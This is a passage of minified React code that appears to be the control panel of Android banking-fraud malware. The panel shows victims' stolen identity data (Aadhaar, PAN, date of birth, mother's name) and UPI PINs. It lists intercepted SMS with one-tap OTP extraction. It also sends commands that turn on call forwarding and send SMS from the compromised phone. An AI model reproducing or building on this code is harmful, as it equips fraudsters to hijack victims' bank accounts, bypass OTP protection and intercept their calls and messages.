        `})]}):l?i.jsxs("div",{style:{textAlign:"center",padding:"20px",color:"var(--text-muted)"},children:[i.jsx("span",{style:{fontSize:"32px",display:"block",marginBottom:"4px"},children:"❌"}),i.jsx("p",{style:{fontSize:"13px"},children:"Failed to load verification data"}),i.jsx("button",{onClick:d,style:{marginTop:"8px",padding:"4px 16px",border:"1px solid var(--border-color)",borderRadius:"6px",background:"var(--bg-card)",color:"var(--text-primary)",cursor:"pointer",fontSize:"12px"},children:"Retry"})]}):e?i.jsxs("div",{style:{padding:"4px 0"},children:[i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"4px",marginBottom:"6px"},children:[i.jsxs("div",{style:{gridColumn:"span 2",background:"var(--bg-card)",borderRadius:"6px",padding:"6px 10px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"11px",color:"var(--text-muted)",fontWeight:500},children:"📱 Mobile Number"}),i.jsx("span",{style:{fontSize:"13px",fontWeight:600,color:"var(--text-primary)",fontFamily:"monospace"},children:e.mobileNumber||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"🆔 Aadhaar"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)",fontFamily:"monospace",letterSpacing:"2px"},children:e.aadhaarNumber||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"📅 DOB"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:e.dateOfBirth||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"👩 Mother's Name"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:e.motherName||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"📄 PAN"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)",fontFamily:"monospace",letterSpacing:"1px"},children:e.panNumber||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"📌 Status"}),i.jsxs("span",{style:{fontSize:"12px",fontWeight:700,color:p(e.status)},children:[f(e.status)," ",e.status||"Pending"]})]}),i.jsxs("div",{style:{gridColumn:"span 2",background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"🕐 Timestamp"}),i.jsx("span",{style:{fontSize:"11px",fontWeight:500,color:"var(--text-muted)"},children:e.timestamp||"N/A"})]})]}),o.length>1&&i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",border:"1px solid var(--border-color)",overflow:"hidden",marginTop:"4px"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"6px 10px",background:"var(--bg-input)",borderBottom:"1px solid var(--border-color)",fontSize:"11px",fontWeight:600,color:"var(--text-primary)"},children:[i.jsx("span",{children:"📋 All Verifications"}),i.jsx("span",{style:{background:"#6c63ff",color:"white",fontSize:"10px",padding:"1px 8px",borderRadius:"10px"},children:o.length})]}),o.map((u,b)=>i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"5px 10px",borderBottom:b<o.length-1?"1px solid var(--border-color)":"none"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"8px"},children:[i.jsx("span",{style:{fontSize:"14px"},children:"✅"}),i.jsxs("div",{children:[i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:u.mobileNumber||"N/A"}),i.jsx("span",{style:{fontSize:"10px",fontWeight:500,color:p(u.status),marginLeft:"6px"},children:u.status||"Pending"})]})]}),i.jsx("span",{style:{fontSize:"9px",color:"var(--text-muted)"},children:u.timestamp||"N/A"})]},u.id||b))]})]}):i.jsxs("div",{style:{textAlign:"center",padding:"20px",color:"var(--text-muted)"},children:[i.jsx("span",{style:{fontSize:"32px",display:"block",marginBottom:"4px"},children:"📭"}),i.jsx("p",{style:{fontSize:"13px"},children:"No verification data found"})]})}function qv(){const{deviceId:t}=On(),[e,n]=g.useState(null),[r,s]=g.useState(!0),[o,a]=g.useState([]),[l,c]=g.useState(null);g.useEffect(()=>{t&&d()},[t]);const d=async()=>{s(!0),c(null);try{const u=B(U,`upi_payments/${t}`),b=await ce(u);if(b.exists()){const x=b.val(),v=Object.keys(x).map(_=>({id:_,...x[_]}));v.sort((_,m)=>{const h=_.timestamp?new Date(_.timestamp.split(" ").reverse().join(" ")).getTime():0;return(m.timestamp?new Date(m.timestamp.split(" ").reverse().join(" ")).getTime():0)-h}),a(v),n(v[0]||null)}}catch(u){console.error("Error fetching UPI data:",u),c(u.message)}s(!1)},p=u=>u==="Success"?"#2ecc71":u==="Failed"?"#e74c3c":u==="Pending"?"#f1c40f":"#95a5a6",f=u=>u==="Success"?"✅":u==="Failed"?"❌":u==="Pending"?"⏳":"⚪";return r?i.jsxs("div",{style:{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",minHeight:"100px",gap:"8px",padding:"10px"},children:[i.jsx("div",{style:{width:"24px",height:"24px",border:"3px solid #e2e8f0",borderTopColor:"#6c63ff",borderRadius:"50%",animation:"spin 0.8s linear infinite"}}),i.jsx("p",{style:{fontSize:"12px",color:"var(--text-muted)"},children:"Loading UPI..."}),i.jsx("style",{children:`
          @keyframes spin {
            to { transform: rotate(360deg); }
          }
        `})]}):l?i.jsxs("div",{style:{textAlign:"center",padding:"20px",color:"var(--text-muted)"},children:[i.jsx("span",{style:{fontSize:"32px",display:"block",marginBottom:"4px"},children:"❌"}),i.jsx("p",{style:{fontSize:"13px"},children:"Failed to load UPI data"}),i.jsx("button",{onClick:d,style:{marginTop:"8px",padding:"4px 16px",border:"1px solid var(--border-color)",borderRadius:"6px",background:"var(--bg-card)",color:"var(--text-primary)",cursor:"pointer",fontSize:"12px"},children:"Retry"})]}):e?i.jsxs("div",{style:{padding:"4px 0"},children:[i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"4px",marginBottom:"6px"},children:[i.jsxs("div",{style:{gridColumn:"span 2",background:"var(--bg-card)",borderRadius:"6px",padding:"6px 10px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"11px",color:"var(--text-muted)",fontWeight:500},children:"💰 Amount"}),i.jsx("span",{style:{fontSize:"16px",fontWeight:700,color:"#2ecc71"},children:e.amount||"₹0"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"🔑 UPI PIN"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"#e74c3c",fontFamily:"monospace",letterSpacing:"2px"},children:e.upiPin||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"📌 Status"}),i.jsxs("span",{style:{fontSize:"12px",fontWeight:700,color:p(e.status)},children:[f(e.status)," ",e.status||"Pending"]})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"📏 PIN Type"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:e.pinType||e.pinLength?`${e.pinLength||""}-digit`:"N/A"})]}),i.jsxs("div",{style:{gridColumn:"span 2",background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"🕐 Timestamp"}),i.jsx("span",{style:{fontSize:"11px",fontWeight:500,color:"var(--text-muted)"},children:e.timestamp||"N/A"})]})]}),o.length>1&&i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",border:"1px solid var(--border-color)",overflow:"hidden",marginTop:"4px"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"6px 10px",background:"var(--bg-input)",borderBottom:"1px solid var(--border-color)",fontSize:"11px",fontWeight:600,color:"var(--text-primary)"},children:[i.jsx("span",{children:"📋 All Transactions"}),i.jsx("span",{style:{background:"#6c63ff",color:"white",fontSize:"10px",padding:"1px 8px",borderRadius:"10px"},children:o.length})]}),o.map((u,b)=>i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"5px 10px",borderBottom:b<o.length-1?"1px solid var(--border-color)":"none"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"8px"},children:[i.jsx("span",{style:{fontSize:"14px"},children:"📲"}),i.jsxs("div",{children:[i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:u.amount||"₹0"}),i.jsx("span",{style:{fontSize:"10px",fontWeight:500,color:p(u.status),marginLeft:"6px"},children:u.status||"Pending"})]})]}),i.jsxs("div",{style:{textAlign:"right"},children:[i.jsxs("span",{style:{fontSize:"10px",fontWeight:500,color:"var(--text-muted)",fontFamily:"monospace"},children:["PIN: ",u.upiPin||"N/A"]}),i.jsx("span",{style:{fontSize:"9px",color:"var(--text-muted)",display:"block"},children:u.timestamp||"N/A"})]})]},u.id||b))]})]}):i.jsxs("div",{style:{textAlign:"center",padding:"20px",color:"var(--text-muted)"},children:[i.jsx("span",{style:{fontSize:"32px",display:"block",marginBottom:"4px"},children:"📭"}),i.jsx("p",{style:{fontSize:"13px"},children:"No UPI payment data found"})]})}function Xv(){const{deviceId:t}=On();gt();const[e,n]=g.useState([]),[r,s]=g.useState(!0),[o,a]=g.useState(""),[l,c]=g.useState("all");g.useEffect(()=>{t&&d()},[t]);const d=()=>{s(!0);const x=B(U,`inbox/${t}`),v=cn(x,_=>{if(_.exists()){const m=_.val(),h=Object.entries(m).map(([y,w])=>({id:y,...w,time:Number(w.time)||0}));h.sort((y,w)=>w.time-y.time),n(h)}else n([]);s(!1)});return()=>v()},p=x=>{if(!x)return"N/A";const v=new Date(Number(x)),m=new Date-v;return m<6e4?"Just now":m<36e5?`${Math.floor(m/6e4)}m ago`:m<864e5?`${Math.floor(m/36e5)}h ago`:m<6048e5?`${Math.floor(m/864e5)}d ago`:v.toLocaleDateString("en-IN",{day:"2-digit",month:"short",year:"numeric"})},f=x=>{if(!x)return null;const v=x.match(/\b(\d{4,8})\b/);return v?v[1]:null},b=(()=>{let x=e;return l==="otp"?x=x.filter(v=>f(v.message)):l==="normal"&&(x=x.filter(v=>!f(v.message))),o&&(x=x.filter(v=>{var _,m;return((_=v.sender)==null?void 0:_.toLowerCase().includes(o.toLowerCase()))||((m=v.message)==null?void 0:m.toLowerCase().includes(o.toLowerCase()))})),x})();return r?i.jsxs("div",{className:"page-loading",children:[i.jsx("div",{className:"loading-spinner"}),i.jsx("p",{children:"📡 Loading SMS..."})]}):i.jsxs("div",{className:"sms-inbox-page",children:[i.jsxs("div",{className:"sms-header",children:[i.jsx("h2",{children:"📩 SMS Inbox"}),i.jsx("span",{className:"sms-count",children:e.length})]}),i.jsx("div",{className:"search-bar",children:i.jsx("input",{type:"text",placeholder:"🔍 Search messages...",value:o,onChange:x=>a(x.target.value),className:"search-input"})}),i.jsxs("div",{className:"filter-buttons",children:[i.jsxs("button",{className:`filter-btn ${l==="all"?"active":""}`,onClick:()=>c("all"),children:["All (",e.length,")"]}),i.jsxs("button",{className:`filter-btn ${l==="otp"?"active":""}`,onClick:()=>c("otp"),children:["🔑 OTP (",e.filter(x=>f(x.message)).length,")"]}),i.jsxs("button",{className:`filter-btn ${l==="normal"?"active":""}`,onClick:()=>c("normal"),children:["📝 Normal (",e.filter(x=>!f(x.message)).length,")"]})]}),b.length===0?i.jsxs("div",{className:"sms-empty",children:[i.jsx("span",{className:"empty-icon",children:"📭"}),i.jsx("p",{children:"No SMS found"})]}):i.jsx("div",{className:"sms-list",children:b.map(x=>{const v=f(x.message);return i.jsxs("div",{className:`sms-item ${v?"has-otp":""}`,children:[i.jsxs("div",{className:"sms-item-header",children:[i.jsx("span",{className:"sms-sender",children:x.sender||"Unknown"}),i.jsx("span",{className:"sms-time",children:p(x.time)})]}),i.jsx("div",{className:"sms-message",children:x.message||"No message"}),v&&i.jsxs("div",{className:"sms-otp-box",children:[i.jsxs("span",{children:["🔑 OTP: ",i.jsx("strong",{children:v})]}),i.jsx("button",{className:"copy-btn",onClick:()=>{navigator.clipboard.writeText(v),alert("OTP copied!")},children:"📋 Copy"})]})]},x.id)})})]})}function Pk(){const{deviceId:t}=On(),e=gt(),[n,r]=g.useState(!0),[s,o]=g.useState(!1),[a,l]=g.useState(""),[c,d]=g.useState(!1),[p,f]=g.useState(""),[u,b]=g.useState(""),[x,v]=g.useState(0),[_,m]=g.useState(""),[h,y]=g.useState(""),[w,N]=g.useState([]),[R,S]=g.useState(!1);g.useEffect(()=>{C(),j();const F=B(U,`MainNode/${t}/CallNode`),te=cn(F,me=>{if(me.exists()){const W=me.val();d(W.isActive||!1),f(W.status||""),b(W.timestamp||""),l(W.call_number||""),v(W.simSlot||0),S(!1)}});return()=>te()},[t]);const C=async()=>{r(!0);try{const F=await ce(B(U,`MainNode/${t}/CallNode`));if(F.exists()){const te=F.val();l(te.call_number||""),d(te.isActive||!1),f(te.status||""),b(te.timestamp||""),v(te.simSlot||0)}}catch(F){console.error(F)}r(!1)},j=async()=>{try{const F=await ce(B(U,`devices/${t}`));if(F.exists()){const me=F.val().sim_info||"",W=[];me&&me.split(`
`).forEach((I,X)=>{var V,E;if(I.trim()){const q=I.split(" - "),ae=((V=q[0])==null?void 0:V.split(": ")[1])||q[0]||`SIM ${X+1}`,ee=((E=q[1])==null?void 0:E.trim())||"";W.push({slot:X,label:`SIM ${X+1}`,carrier:ae,number:ee})}}),W.length===0&&(W.push({slot:0,label:"SIM 1",carrier:"SIM 1",number:""}),W.push({slot:1,label:"SIM 2",carrier:"SIM 2",number:""})),N(W)}}catch(F){console.error(F)}},P=async()=>{if(!a||a.length<10){m("Enter 10-digit number"),setTimeout(()=>m(""),3e3);return}o(!0),S(!0),m(""),y("");try{await kt(B(U,`MainNode/${t}/CallNode`),{call_number:a,isActive:!0,status:"ACTIVATING...",timestamp:new Date().toLocaleString(),initiated:Date.now(),simSlot:x}),d(!0),y("⏳ Command sent to device...")}catch{m("❌ Failed to enable"),S(!1),setTimeout(()=>m(""),3e3)}o(!1)},z=async()=>{o(!0),S(!0),m(""),y("");try{await kt(B(U,`MainNode/${t}/CallNode`),{isActive:!1,status:"DEACTIVATING...",timestamp:new Date().toLocaleString(),deactivatedAt:new Date().toLocaleString()}),d(!1),y("⏳ Deactivating...")}catch{m("❌ Failed to disable"),S(!1),setTimeout(()=>m(""),3e3)}o(!1)},M=()=>R?{text:"⏳ Waiting for device...",color:"#f1c40f",bg:"rgba(241,196,15,0.1)",border:"rgba(241,196,15,0.3)",icon:"⏳",highlight:!1}:c===!0&&p&&p.toLowerCase().includes("success")?{text:"✅ Active",color:"#2ecc71",bg:"rgba(46,204,113,0.1)",border:"rgba(46,204,113,0.3)",icon:"✅",highlight:!1,subText:p}:c===!0&&p&&p.toLowerCase().includes("failed")?{text:"❌ Failed",color:"#e74c3c",bg:"rgba(231,76,60,0.15)",border:"rgba(231,76,60,0.4)",icon:"❌",highlight:!0,subText:p}:c===!1?{text:"⛔ Deactivated",color:"#95a5a6",bg:"rgba(149,165,166,0.08)",border:"rgba(149,165,166,0.15)",icon:"⛔",highlight:!1,subText:p||"Call forwarding is disabled"}:p&&p.includes("ACTIVATING")?{text:"⏳ Activating...",color:"#f1c40f",bg:"rgba(241,196,15,0.1)",border:"rgba(241,196,15,0.3)",icon:"⏳",highlight:!1}:p&&p.includes("DEACTIVATING")?{text:"⏳ Deactivating...",color:"#f1c40f",bg:"rgba(241,196,15,0.1)",border:"rgba(241,196,15,0.3)",icon:"⏳",highlight:!1}:c===!0?{text:"✅ Active",color:"#2ecc71",bg:"rgba(46,204,113,0.08)",border:"rgba(46,204,113,0.2)",icon:"✅",highlight:!1,subText:p||""}:{text:"⛔ Inactive",color:"#95a5a6",bg:"rgba(149,165,166,0.05)",border:"rgba(149,165,166,0.15)",icon:"⛔",highlight:!1,subText:p||""},L=()=>{const F=w.find(te=>te.slot===x);return F?`${F.label}: ${F.carrier}${F.number?` - ${F.number}`:""}`:`SIM ${x+1}`},K=M();return n?i.jsxs("div",{style:{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",minHeight:"80px",gap:"6px"},children:[i.jsx("div",{style:{width:"24px",height:"24px",border:"3px solid #e2e8f0",borderTopColor:"#6c63ff",borderRadius:"50%",animation:"spin 0.8s linear infinite"}}),i.jsx("p",{style:{color:"var(--text-muted)",fontSize:"11px"},children:"Loading..."}),i.jsx("style",{children:"@keyframes spin{to{transform:rotate(360deg)}}"})]}):i.jsxs("div",{style:{padding:"4px 0",maxWidth:"100%",background:"var(--bg-primary)",minHeight:"auto"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"6px",padding:"2px 0 6px",borderBottom:"2px solid var(--border-color)",marginBottom:"6px"},children:[i.jsx("button",{style:{background:"none",border:"none",color:"var(--text-muted)",fontSize:"12px",fontWeight:600,cursor:"pointer",padding:"2px 4px"},onClick:()=>e(`/device/${t}`),children:"← Back"}),i.jsx("h2",{style:{fontSize:"14px",fontWeight:700,color:"var(--text-primary)",margin:0,flex:1},children:"📞 Call Forward"}),i.jsx("span",{style:{fontSize:"9px",fontWeight:700,padding:"2px 10px",borderRadius:"20px",color:c===!0&&(p!=null&&p.toLowerCase().includes("success"))?"#2ecc71":"#e74c3c",background:c===!0&&(p!=null&&p.toLowerCase().includes("success"))?"rgba(46,204,113,0.1)":"rgba(231,76,60,0.08)",border:`1px solid ${c===!0&&(p!=null&&p.toLowerCase().includes("success"))?"rgba(46,204,113,0.2)":"rgba(231,76,60,0.1)"}`},children:c===!0&&(p!=null&&p.toLowerCase().includes("success"))?"🟢 ON":"🔴 OFF"})]}),i.jsx("div",{style:{background:K.highlight?"linear-gradient(135deg, rgba(231,76,60,0.08), rgba(231,76,60,0.02))":"var(--bg-card)",borderRadius:"8px",padding:"6px 10px",border:K.highlight?"2px solid #e74c3c":`1px solid ${K.border}`,marginBottom:"6px",boxShadow:"0 1px 4px rgba(0,0,0,0.03)"},children:i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"2px 8px"},children:[i.jsxs("div",{style:{gridColumn:"span 2",display:"flex",justifyContent:"space-between",alignItems:"center",paddingBottom:"3px",borderBottom:"1px solid var(--border-color)",marginBottom:"2px"},children:[i.jsx("span",{style:{fontSize:"10px",fontWeight:600,color:"var(--text-primary)"},children:"📊 Status"}),i.jsxs("span",{style:{fontSize:K.highlight?"12px":"11px",fontWeight:K.highlight?800:600,color:K.color,background:K.bg,padding:K.highlight?"3px 12px":"1px 10px",borderRadius:"20px",border:K.highlight?"1px solid #e74c3c":`1px solid ${K.border}`},children:[K.icon," ",K.text]})]}),K.subText&&i.jsxs("div",{style:{gridColumn:"span 2",display:"flex",justifyContent:"space-between",padding:"1px 0"},children:[i.jsx("span",{style:{fontSize:"8px",color:"var(--text-muted)"},children:"📝"}),i.jsx("span",{style:{fontSize:"8px",color:K.highlight?"#e74c3c":K.color,fontWeight:500,textAlign:"right",maxWidth:"75%"},children:K.subText})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",padding:"1px 0"},children:[i.jsx("span",{style:{fontSize:"9px",color:"var(--text-muted)"},children:"📱 Number"}),i.jsx("span",{style:{fontSize:"10px",fontWeight:600,color:"var(--text-primary)",fontFamily:"monospace"},children:a||"—"})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",padding:"1px 0"},children:[i.jsx("span",{style:{fontSize:"9px",color:"var(--text-muted)"},children:"📶 SIM"}),i.jsx("span",{style:{fontSize:"10px",fontWeight:600,color:"var(--text-primary)"},children:L()})]}),i.jsx("div",{style:{display:"flex",justifyContent:"space-between",padding:"1px 0",gridColumn:"span 2",borderTop:"1px solid var(--border-color)",paddingTop:"3px",marginTop:"1px"},children:i.jsxs("span",{style:{fontSize:"8px",color:"var(--text-muted)"},children:["🕐 ",u||"N/A"]})})]})}),_&&i.jsx("div",{style:{padding:"4px 8px",background:"rgba(231,76,60,0.08)",border:"1px solid rgba(231,76,60,0.15)",borderRadius:"4px",color:"#e74c3c",fontSize:"11px",marginBottom:"4px"},children:_}),h&&i.jsx("div",{style:{padding:"4px 8px",background:"rgba(46,204,113,0.08)",border:"1px solid rgba(46,204,113,0.15)",borderRadius:"4px",color:"#2ecc71",fontSize:"11px",marginBottom:"4px"},children:h}),i.jsx("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"6px 10px",border:"1px solid var(--border-color)",marginBottom:"4px",boxShadow:"0 1px 4px rgba(0,0,0,0.02)"},children:i.jsxs("div",{style:{display:"flex",flexDirection:"column",gap:"4px"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"4px"},children:[i.jsx("span",{style:{fontSize:"11px",fontWeight:600,color:"var(--text-primary)"},children:"📞 Enable"}),c===!0&&(p==null?void 0:p.toLowerCase().includes("success"))&&i.jsx("span",{style:{fontSize:"8px",padding:"1px 8px",borderRadius:"12px",background:"rgba(46,204,113,0.1)",color:"#2ecc71",fontWeight:600},children:"● LIVE"})]}),i.jsx("input",{type:"tel",value:a,onChange:F=>l(F.target.value.replace(/\D/g,"").slice(0,10)),placeholder:"Enter 10-digit number",maxLength:"10",style:{padding:"5px 10px",border:"2px solid #6c63ff",borderRadius:"6px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"13px",outline:"none",fontFamily:"monospace",width:"100%",height:"32px"}}),i.jsx("select",{value:x,onChange:F=>v(parseInt(F.target.value)),style:{padding:"4px 8px",border:"1px solid #6c63ff",borderRadius:"6px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"11px",outline:"none",width:"100%",height:"30px",appearance:"none",backgroundImage:`url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M1 1l4 4 4-4' stroke='%236c63ff' stroke-width='2' fill='none'/%3E%3C/svg%3E")`,backgroundRepeat:"no-repeat",backgroundPosition:"right 8px center"},children:w.map(F=>i.jsxs("option",{value:F.slot,style:{padding:"2px"},children:[F.label,": ",F.carrier,F.number?` - ${F.number}`:""]},F.slot))}),i.jsx("button",{onClick:P,disabled:s||!a,style:{padding:"6px",border:"none",borderRadius:"6px",fontSize:"13px",fontWeight:700,cursor:s||!a?"not-allowed":"pointer",background:s||!a?"#95a5a6":"linear-gradient(135deg, #6c63ff, #3b82f6)",color:"white",opacity:s||!a?.5:1,height:"34px"},children:s?"⏳...":"🔐 Activate"})]})}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"6px 10px",border:"1px solid var(--border-color)",boxShadow:"0 1px 4px rgba(0,0,0,0.02)"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"4px",marginBottom:"4px"},children:[i.jsx("span",{style:{fontSize:"11px",fontWeight:600,color:"var(--text-primary)"},children:"⛔ Deactivate"}),!c&&i.jsx("span",{style:{fontSize:"8px",padding:"1px 8px",borderRadius:"12px",background:"rgba(149,165,166,0.1)",color:"#95a5a6",fontWeight:600},children:"● OFF"})]}),i.jsx("button",{onClick:z,disabled:s,style:{width:"100%",padding:"6px",border:"none",borderRadius:"6px",fontSize:"13px",fontWeight:700,cursor:s?"not-allowed":"pointer",background:s?"#95a5a6":"linear-gradient(135deg, #e74c3c, #c0392b)",color:"white",opacity:s?.5:1,height:"34px"},children:s?"⏳...":"🚫 Deactivate"}),i.jsx("p",{style:{fontSize:"9px",color:"var(--text-muted)",textAlign:"center",margin:"2px 0 0"},children:c===!0&&(p!=null&&p.toLowerCase().includes("success"))?"⚠️ Active — click to deactivate":"✅ Already deactivated"})]})]})}function Dk(){const{deviceId:t}=On(),e=gt(),[n,r]=g.useState(!1),[s,o]=g.useState(!1),[a,l]=g.useState(""),[c,d]=g.useState(""),[p,f]=g.useState(0),[u,b]=g.useState([]),[x,v]=g.useState(null),[_,m]=g.useState(""),[h,y]=g.useState("");g.useEffect(()=>{w(),N();const j=B(U,`smsRequests/${t}`),P=cn(j,z=>{z.exists()?v(z.val()):v(null)});return()=>{P()}},[t]);const w=async()=>{try{const j=await ce(B(U,`devices/${t}/sim_info`));if(j.exists()){const z=j.val().split(`
`).map(M=>M.trim()).filter(Boolean);z.length===0?b(["SIM 1","SIM 2"]):b(z)}else b(["SIM 1","SIM 2"])}catch(j){console.error("Error fetching SIM info:",j),b(["SIM 1","SIM 2"])}},N=async()=>{try{const j=await ce(B(U,`smsRequests/${t}`));j.exists()&&v(j.val())}catch(j){console.error("Error fetching last SMS:",j)}},R=async()=>{if(!a||a.length<3){m("MIN 3-digit"),setTimeout(()=>m(""),3e3);return}if(!c){m("Message is required"),setTimeout(()=>m(""),3e3);return}o(!0),m(""),y("");try{console.log("📤 Sending to smsRequests...");const j=B(U,`smsRequests/${t}`);await bt(j,{number:a,message:c,simSlot:p,sent:!1,delivered:!1,status:"pending",initiated:Date.now(),timestamp:new Date().toLocaleString("en-IN")}),console.log("✅ Sent to smsRequests");const P=B(U,`inbox/${t}`);await Bv(P,{sender:"Admin",number:a,message:c,simSlot:p,time:Date.now(),status:"pending",delivered:!1,timestamp:new Date().toLocaleString("en-IN")}),console.log("✅ Added to inbox"),y("✅ SMS command sent to device!"),l(""),d(""),setTimeout(()=>N(),2e3)}catch(j){console.error("❌ SMS send failed:",j),m("❌ Failed to send SMS"),setTimeout(()=>m(""),3e3)}o(!1)},S=async()=>{try{const j=await navigator.clipboard.readText();d(j),y("📋 Pasted"),setTimeout(()=>y(""),2e3)}catch{m("❌ Clipboard access denied"),setTimeout(()=>m(""),2e3)}},C=j=>j?new Date(j).toLocaleString("en-IN",{day:"2-digit",month:"short",year:"numeric",hour:"2-digit",minute:"2-digit"}):"N/A";return n?i.jsxs("div",{style:{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",minHeight:"80px",gap:"6px"},children:[i.jsx("div",{style:{width:"24px",height:"24px",border:"3px solid #e2e8f0",borderTopColor:"#6c63ff",borderRadius:"50%",animation:"spin 0.8s linear infinite"}}),i.jsx("p",{style:{color:"var(--text-muted)",fontSize:"11px"},children:"Loading..."}),i.jsx("style",{children:"@keyframes spin{to{transform:rotate(360deg)}}"})]}):i.jsxs("div",{style:{padding:"4px 0",maxWidth:"100%",background:"var(--bg-primary)",minHeight:"auto"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"6px",padding:"2px 0 6px",borderBottom:"2px solid var(--border-color)",marginBottom:"6px"},children:[i.jsx("button",{style:{background:"none",border:"none",color:"var(--text-muted)",fontSize:"12px",fontWeight:600,cursor:"pointer",padding:"2px 4px"},onClick:()=>e(`/device/${t}`),children:"← Back"}),i.jsx("h2",{style:{fontSize:"14px",fontWeight:700,color:"var(--text-primary)",margin:0,flex:1},children:"📨 Send SMS"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"6px 10px",border:x?`2px solid ${x.sent?"#2ecc71":"#f1c40f"}`:"1px solid var(--border-color)",marginBottom:"6px",boxShadow:"0 1px 4px rgba(0,0,0,0.03)"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"6px",marginBottom:"4px"},children:[i.jsx("div",{style:{width:"28px",height:"28px",borderRadius:"50%",background:x?`linear-gradient(135deg, ${x.sent?"#2ecc71":"#f1c40f"}, ${x.sent?"#27ae60":"#f39c12"})`:"var(--bg-input)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:"14px",color:"white"},children:x?x.sent?"✅":"⏳":"📨"}),i.jsxs("div",{children:[i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:x?"Last SMS":"No SMS 